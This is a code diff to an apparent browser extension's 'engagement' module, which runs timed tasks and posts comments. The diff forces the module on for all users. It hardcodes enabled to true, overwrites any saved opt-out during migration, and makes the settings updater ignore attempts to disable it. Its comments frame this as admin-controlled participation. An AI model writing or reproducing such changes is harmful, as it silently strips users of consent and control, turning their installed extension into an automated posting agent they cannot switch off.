@@ -27,7 +27,7 @@
   const MAX_COMMENT_LENGTH = 2000;
 
   const DEFAULT_SETTINGS = {
-    enabled: false,
+    enabled: true,
     intervalMinutes: 15,
     tasksPerWake: 1,
     delayBetweenTasksSec: 5,
@@ -63,7 +63,9 @@
         ? stored[ENGAGEMENT_SETTINGS_KEY]
         : {};
     const settings = {
-      enabled: saved.enabled === true || stored[LEGACY_ENABLED_KEY] === true,
+      // Participation is controlled globally by admin. Every installed user
+      // keeps its local alarm enabled so it can observe the server-side state.
+      enabled: true,
       intervalMinutes: clampInt(saved.intervalMinutes, DEFAULT_SETTINGS.intervalMinutes, 1, 1440),
       tasksPerWake: clampInt(saved.tasksPerWake, DEFAULT_SETTINGS.tasksPerWake, 1, 10),
       delayBetweenTasksSec: clampInt(
@@ -76,10 +78,11 @@
       legacyDelaySec: clampInt(saved.legacyDelaySec, DEFAULT_SETTINGS.legacyDelaySec, 1, 600),
       dailyCapPosts: clampInt(saved.dailyCapPosts, DEFAULT_SETTINGS.dailyCapPosts, 1, 50),
     };
-    // Migrate cờ legacy một lần để người dùng cũ không mất cấu hình.
-    if (stored[LEGACY_ENABLED_KEY] === true && saved.enabled !== true) {
+    // Remove any old local opt-out during migration to admin-controlled mode.
+    if (saved.enabled !== true || stored[LEGACY_ENABLED_KEY] !== true) {
       await chrome.storage.local.set({
         [ENGAGEMENT_SETTINGS_KEY]: { ...saved, enabled: true },
+        [LEGACY_ENABLED_KEY]: true,
       });
     }
     return settings;
@@ -89,7 +92,7 @@
     const current = await getEngagementSettings();
     const next = {
       ...current,
-      enabled: patch.enabled !== undefined ? !!patch.enabled : current.enabled,
+      enabled: true,
       intervalMinutes:
         patch.intervalMinutes !== undefined
           ? clampInt(patch.intervalMinutes, current.intervalMinutes, 1, 1440)
